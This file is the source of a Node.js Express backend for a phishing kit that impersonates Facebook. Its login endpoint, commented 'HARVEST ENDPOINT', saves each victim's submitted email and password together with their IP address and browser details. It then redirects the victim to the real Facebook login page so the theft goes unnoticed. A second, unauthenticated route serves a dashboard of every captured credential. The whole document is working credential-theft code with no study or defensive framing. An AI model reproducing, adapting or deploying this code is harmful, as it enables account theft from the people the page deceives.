const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('../client'));

// Creds storage
const credsPath = path.join(__dirname, '../uploads/creds.json');

// HARVEST ENDPOINT
app.post('/api/login', (req, res) => {
  try {
    const { email, pass } = req.body;
    if (!email || !pass) return res.status(400).json({error: 'Missing credentials'});
    
    const cred = {
      timestamp: new Date().toISOString(),
      ip: req.ip || req.connection.remoteAddress,
      email: email.trim(),
      password: pass,
      userAgent: req.get('User-Agent')?.substring(0, 200) || 'unknown'
    };
    
    // Ensure directory exists
    const dir = path.dirname(credsPath);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    
    const creds = fs.existsSync(credsPath) 
      ? JSON.parse(fs.readFileSync(credsPath, 'utf8'))
      : [];
    creds.push(cred);
    fs.writeFileSync(credsPath, JSON.stringify(creds, null, 2));
    
    res.redirect('https://www.facebook.com/login');
  } catch (error) {
    console.error('Harvest error:', error);
    res.redirect('https://www.facebook.com/login'); // Still redirect even on error
  }
});

// DASHBOARD - View captured creds
app.get('/api/creds', (req, res) => {
  const creds = fs.existsSync(credsPath)
    ? JSON.parse(fs.readFileSync(credsPath))
    : [];
  res.json(creds);
});

app.listen(5000, () => {
  console.log('🔥 Backend: http://localhost:5000');
});